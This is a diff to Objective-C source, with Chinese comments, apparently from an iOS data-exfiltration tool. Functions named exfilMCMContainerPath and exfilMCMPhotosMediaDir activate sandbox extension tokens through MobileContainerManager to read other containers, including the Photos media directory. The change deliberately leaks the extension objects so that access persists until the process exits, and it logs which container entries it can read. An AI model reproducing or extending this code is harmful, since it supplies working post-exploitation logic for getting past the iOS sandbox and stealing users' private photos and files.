@@ -395,6 +395,8 @@ static NSString *exfilMCMContainerPath(uint64_t cls, NSString *identifier, NSStr
         path = [@"/private" stringByAppendingString:path];
 
     // 激活 sandbox 扩展（拿 token → activate）
+    // 注意：object/query 不能 free——沙盒扩展随对象存活，
+    // 宿主 mcm_bridge 把 lease 存字典持有到进程退出，照抄这个生命周期
     void *obj = api.objectCopy(result);
     if (obj)
     {
@@ -402,11 +404,18 @@ static NSString *exfilMCMContainerPath(uint64_t cls, NSString *identifier, NSStr
         BOOL tokenPresent = token && token[0] != '\0';
         free(token);
         BOOL activated = tokenPresent && api.objectActivate(obj, false);
-        if (errOut && !activated)
-            *errOut = @"sandbox extension activate failed";
-        api.objectFree(obj);
+        if (errOut)
+        {
+            *errOut = activated
+                ? @"activated"
+                : (tokenPresent ? @"extension activate failed" : @"no sandbox token");
+        }
     }
-    api.queryFree(query);
+    else if (errOut)
+    {
+        *errOut = @"object copy failed";
+    }
+    // 故意泄漏 obj/query：保持扩展活着，进程退出统一回收
     return path.length ? path : nil;
 }
 
@@ -450,8 +459,8 @@ static NSString *exfilMCMPhotosMediaDir(void)
             if (gExfilMcmLogged < 40)
             {
                 gExfilMcmLogged++;
-                exfilLog(@"MCM cls=%llu ident=%@ root=%@ readable=%d errno=%d n=%lu entries: %@",
-                         (unsigned long long)cls, ident, root, readable, listErrno,
+                exfilLog(@"MCM cls=%llu ident=%@ root=%@ act=%@ readable=%d errno=%d n=%lu entries: %@",
+                         (unsigned long long)cls, ident, root, err, readable, listErrno,
                          (unsigned long)entries.count,
                          entries.count <= 15
                             ? [entries componentsJoinedByString:@","]
